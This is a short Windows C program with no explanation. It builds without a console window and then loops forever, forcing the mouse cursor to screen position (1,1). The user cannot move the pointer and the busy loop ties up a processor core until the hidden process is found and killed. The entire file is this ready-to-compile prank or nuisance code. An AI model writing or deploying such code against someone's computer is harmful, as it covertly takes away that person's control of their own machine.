#include<windows.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
void main()
{
        int x,y;
        while(1)
        {
         x=1;
         y=1;
         SetCursorPos(x,y);
        }
        return ;
}

